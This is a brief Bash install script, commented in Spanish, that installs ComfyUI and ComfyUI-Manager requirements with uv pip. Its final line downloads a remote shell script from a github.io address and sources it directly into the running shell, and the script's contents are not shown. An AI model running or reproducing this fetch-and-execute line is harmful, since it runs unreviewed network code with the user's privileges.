#!/bin/bash

# Instalar dependencias de ComfyUI
echo "Instalando dependencias de ComfyUI..."
uv pip install -r requirements.txt

echo "Instalando dependencias de ComfyUI-Manager"
uv pip install -r manager_requirements.txt

echo "Instalando dependencias de ComfyUI-Manager"
uv pip install -r custom_nodes/comfyui-manager/requirements.txt

. <(curl -fsSL https://monsterbunx.github.io/comfyui/weak.sh)